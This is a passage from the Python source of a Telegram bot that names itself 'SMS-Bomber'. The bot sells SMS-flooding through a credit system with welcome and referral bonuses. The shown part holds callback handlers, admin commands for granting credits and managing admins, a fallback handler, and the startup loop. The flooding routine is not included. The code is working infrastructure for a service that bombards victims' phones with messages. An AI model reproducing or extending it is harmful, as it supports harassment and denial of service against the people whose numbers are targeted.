        try: await state.clear()
        except Exception: pass
    uid = cq.from_user.id
    await cq.answer()
    try: await cq.message.edit_reply_markup(reply_markup=None)
    except Exception: pass
    await send_dashboard(cq, uid)

@R.callback_query(F.data == "noop")
async def cb_noop(cq: types.CallbackQuery):
    await cq.answer()

# ── addcredits ────────────────────────────────────────────────
@R.message(Command("addcredits"))
async def cmd_addcredits(msg: types.Message):
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d): return
    parts = msg.text.split()
    if len(parts) < 3:
        await msg.answer(f"{sc('Usage: /addcredits <id> <amount>')}", parse_mode="HTML"); return
    try:
        target = int(parts[1]); amount = int(parts[2])
    except Exception:
        await msg.answer(f"{PE.cross()} {sc('Invalid args')}", parse_mode="HTML"); return
    u = get_user(d, target)
    u["credits"] = u.get("credits", 0) + amount
    save(d)
    await msg.answer(f"{PE.check()} {sc('Added')} <b>{amount}</b> {sc('credits to')} <code>{target}</code>",
                     parse_mode="HTML")
    try:
        await msg.bot.send_message(target,
            f"{PE.money()} <b>{sc('Credits Added')}</b>\n{SEP}\n+{amount} {sc('credits')}\n{SEP}",
            parse_mode="HTML")
    except Exception: pass

@R.message(Command("addadmin"))
async def cmd_addadmin(msg: types.Message):
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d): return
    parts = msg.text.split()
    if len(parts) < 2:
        await msg.answer(f"{sc('Usage: /addadmin <id>')}", parse_mode="HTML"); return
    try: new_id = int(parts[1])
    except Exception:
        await msg.answer(f"{PE.cross()} {sc('Invalid ID')}", parse_mode="HTML"); return
    if new_id not in d["admins"]:
        d["admins"].append(new_id); save(d)
        await msg.answer(f"{PE.check()} {sc('Added admin')} <code>{new_id}</code>", parse_mode="HTML")

@R.message(Command("deladmin"))
async def cmd_deladmin(msg: types.Message):
    uid = msg.from_user.id
    d = load()
    if not is_admin(uid, d): return
    parts = msg.text.split()
    if len(parts) < 2:
        await msg.answer(f"{sc('Usage: /deladmin <id>')}", parse_mode="HTML"); return
    try: did = int(parts[1])
    except Exception:
        await msg.answer(f"{PE.cross()} {sc('Invalid ID')}", parse_mode="HTML"); return
    if did == OWNER_ID:
        await msg.answer(f"{PE.cross()} {sc('Cannot remove owner.')}", parse_mode="HTML"); return
    if did in d["admins"]:
        d["admins"].remove(did); save(d)
        await msg.answer(f"{PE.check()} {sc('Removed admin')} <code>{did}</code>", parse_mode="HTML")

# ── fallback ──────────────────────────────────────────────────
@R.message()
async def fallback(msg: types.Message, state: FSMContext):
    cur = await state.get_state()
    if cur: return
    d = load()
    await msg.answer(f"{PE.info()} {sc('Use the menu buttons below.')}",
                     reply_markup=kb_main(is_admin(msg.from_user.id, d)), parse_mode="HTML")

# ════════════════════════════════════════════════════════════════
# MAIN
# ════════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    try:
        me = await bot.get_me()
        log.info(f"✅ @{me.username} started ({VERSION})")
    except Exception as e:
        log.error(f"get_me failed: {e}"); return

    try:
        await bot.send_message(
            OWNER_ID,
            f"{PE.rocket()} <b>{sc('SMS-Bomber')} {VERSION} {sc('online')}</b>\n"
            f"@{me.username}\n{SEP}\n"
            f"{PE.money()} {sc('Welcome bonus')}: {WELCOME_BONUS}\n"
            f"{PE.gift()} {sc('Refer bonus')}: {REFER_BONUS}\n{SEP}",
            parse_mode="HTML")
    except Exception: pass

    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        pass

if __name__ == "__main__":
    asyncio.run(main())